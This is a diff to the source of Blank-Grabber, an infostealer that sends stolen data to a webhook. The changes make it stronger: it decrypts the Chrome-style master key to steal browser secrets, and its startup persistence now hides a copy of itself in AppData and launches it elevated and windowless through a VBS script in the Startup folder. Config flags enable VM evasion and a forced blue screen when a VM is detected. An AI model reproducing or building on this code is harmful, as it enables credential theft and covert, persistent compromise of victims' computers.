@@ -1,11 +1,11 @@
 # https://github.com/Blank-c/Blank-Grabber
 
 WEBHOOK = "Do NOT Enter anything here! Enter your webhook in config.txt"
-PINGME = True #Pings @everyone
-VMPROTECT = True #Tries to protect your webhook from VMs
-BSOD = True #Tries to trigger Blue Screen if VM detected
-STARTUP = True #Puts the grabber in startup (and hide it)
-HIDE_ITSELF = True #Hide the Grabber
+PINGME = True # Pings @everyone
+VMPROTECT = True # Tries to protect your webhook from VMs
+BSOD = True # Tries to trigger Blue Screen if VM detected
+STARTUP = True # Puts the grabber in startup (and hide it)
+HIDE_ITSELF = True # Hide the Grabber
 
 import os
 if os.name!='nt':
@@ -65,7 +65,7 @@ class vmprotect:
                 if kill.returncode != 0:
                     fquit(True)
         try:
-            requests.get(f'https://‮blank{generate()}.in')
+            requests.get(f'https://blank{generate()}.in')
         except Exception:
             pass
         else:
@@ -418,8 +418,8 @@ class BlankGrabber:
         with open(key) as key:
             key = json.load(key)
         try:
-            key = key.get("os_crypt").get("encrypted_key")
-        except AttributeError:
+            key = key["os_crypt"]["encrypted_key"]
+        except (AttributeError, KeyError):
             return None
         key = base64.b64decode(key)[5:]
         return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
@@ -473,11 +473,15 @@ if __name__ == "__main__":
                 vmprotect()
             frozen = hasattr(sys, 'frozen')
             if frozen and STARTUP:
-                if os.path.basename(os.path.dirname(sys.executable)) != "Startup":
+                if os.path.basename(os.path.dirname(sys.executable)) != "Roaming":
                     try:
-                        path = os.getenv("appdata") + f"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{generate()}.exe"
-                        BlankGrabber.copy(sys.executable, path)
+                        vbspath = os.getenv("appdata") + f"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{generate()}.vbs"
+                        path = os.getenv("appdata") + f"\\{generate()}.exe"
+                        BlankGrabber.copy("Blank", sys.executable, path)
                         subprocess.run(f'attrib "{path}" +s +h', shell= True, capture_output= True)
+                        with open(vbspath, 'w') as vbs:
+                            vbs.write(f'''Set oShell = CreateObject("Shell.Application")
+oShell.ShellExecute "cmd.exe", "/c ""{path}""" , , "runas", 0''')
                     except Exception:
                         pass
             
